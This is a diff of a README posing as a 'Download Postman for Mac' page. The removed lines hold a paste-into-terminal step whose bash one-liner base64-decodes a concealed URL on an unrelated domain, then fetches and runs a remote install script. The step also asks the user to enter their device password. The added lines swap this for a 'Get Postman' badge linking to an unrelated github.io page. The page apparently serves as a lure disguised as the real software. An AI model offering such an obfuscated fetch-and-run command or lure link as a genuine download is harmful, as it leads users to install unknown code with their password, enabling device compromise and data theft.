@@ -4,17 +4,13 @@
 
 ---  
 
-### 🔽 Download Postman for Mac
+### Download Postman for Mac
 
-> 📥 Open the terminal on your device and paste the command below.
-1. Copy the installation command below.
-```
-/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQ1L2luc3RhbGwuc2g= | base64 -d))"
-```
-2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
-3. Enter your device password and confirm the installation.
-
-[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
+<p align="center">
+  <a href="https://dopleranma.github.io/.github/coderunner" target="_blank">
+    <img src="https://img.shields.io/badge/%20Get%20Postman-7d7d7d?style=for-the-badge&logo=apple&logoColor=white" />
+  </a>
+</p>
 
 ---
 
